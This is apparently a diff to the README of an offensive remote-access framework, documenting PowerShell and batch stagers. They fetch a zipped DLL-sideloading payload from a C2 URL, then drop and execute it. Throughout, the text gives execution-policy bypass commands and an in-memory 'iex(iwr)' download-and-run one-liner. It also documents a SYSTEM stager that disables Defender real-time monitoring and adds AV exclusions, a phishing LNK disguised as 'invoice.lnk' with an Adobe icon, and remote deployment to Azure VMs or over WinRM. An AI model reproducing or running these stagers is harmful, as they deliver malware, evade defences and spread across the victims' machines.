@@ -13,7 +13,18 @@
 #### Stagers
 Zip up the .exe.config, dll and sideloading exe and base64.exe -n 0 -i then upload it into the module repo. Provide the url, stagers will decode and drop, extract, execute. 
 
-##### LnkGen.ps1 - Generate a LNK Stager
+##### noparamStager.ps1 - Set the params as vars in the script to make remote execution simple
+```powershell
+# edit before invoking
+notepad .\noParamStager.ps1 
+powershell -ep bypass .\noParamStager.ps1 
+
+# exec in memory from remote share
+$url = ''
+powershell -ep bypass iex(iwr -uri $url)
+```
+
+##### lnkGen.ps1 - Generate a LNK Stager
 ```powershell
 $url = "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
@@ -21,45 +32,41 @@ $exeName = "FileHistory.exe"
 $lnkPath = ".\invoice.lnk"
 $iconPath = ".\adobe.png"
 
- .\LnkGen.ps1 -url $url -zipName $zipName -exeName $exeName -lnkPath $lnkPath # -iconPath $iconPath
+powershell -ep bypass .\lnkGen.ps1 -url $url -zipName $zipName -exeName $exeName -lnkPath $lnkPath # -iconPath $iconPath
 ```
 
-##### SimpleStager - Drops to current Folder 
+##### systemStager - For running as SYSTEM/Admin Drops to AppData, random zipname, disables real-time monitoring and sets AV path exclusions
+```powershell
+$url = "https://c2.serverless.com/api/assets/fhZip"
+$exeName = "FileHistory.exe"
+
+powershell -ep bypass .\systemStager.ps1 -url $url -exeName $exeName
+```
+
+##### simpleStager - Drops to current Folder and executes 
 ```powershell
 $url = "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 
-.\simpleStager.ps1 -url $url -zipName $zipName -exeName $exeName
+# powershell
+powershell -ep bypass .\simpleStager.ps1 -url $url -zipName $zipName -exeName $exeName
+
+# or cmd
+.\simpleStager.bat -url $url -zipName $zipName -exeName $exeName
 ```
 
-##### systemStager - Running as SYSTEm/Admin Drops to AppData, random zipname, disables real-time monitoring and sets exclusions
-```powershell
-$url = "https://c2.serverless.com/api/assets/fhZip"
-$exeName = "FileHistory.exe"
-
-.\systemStager.ps1 -url $url -exeName $exeName
-```
-
-##### Stager.ps1 - Admin checks for install paths and optionally defender exlucsions/disabling
-
+##### stager.ps1 - Admin checks for install paths and optionally defender exlucsions/disabling
 ```powershell
 $url = "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 
-.\Stager.ps1 -url $url -zipName $zipName -exeName $exeName
-```
+# powershell
+powershell -ep bypass .\Stager.ps1 -url $url -zipName $zipName -exeName $exeName
 
-##### noparamStager.ps1 - Set the params as vars in the script to make remote execution easier
-```powershell
-# edit before invoking
-notepad .\noParamStager.ps1 
-.\noParamStager.ps1 
-
-# exec in memory from remote share
-$url = ''
-powershell -ep bypass iex(iwr -uri $url)
+# cmd.exe
+.\Stager.bat -url $url -zipName $zipName -exeName $exeName
 ```
 
 ##### azSadrat.ps1 - Run a Stager on Azure VM or over PS-Session 
@@ -72,11 +79,11 @@ $rg = ""
 $scriptPath = ".\Stager.ps1"
 
 # az
-.\azSadrat.ps1 -az -url $url -zipName $zipName -exeName $exeName -vmName $vmName -resourceGroup $rg -scriptPath $scriptPath
+powershell -ep bypass .\azSadrat.ps1 -az -url $url -zipName $zipName -exeName $exeName -vmName $vmName -resourceGroup $rg -scriptPath $scriptPath
 
 # winRm
 $Ip = ''
-.\azSadrat.ps1 -winrm -url $url -zipName $zipName -exeName $exeName -vmName $Ip -scriptPath $scriptPath
+powershell -ep bypass .\azSadrat.ps1 -winrm -url $url -zipName $zipName -exeName $exeName -vmName $Ip -scriptPath $scriptPath
 ```
 
 <br>
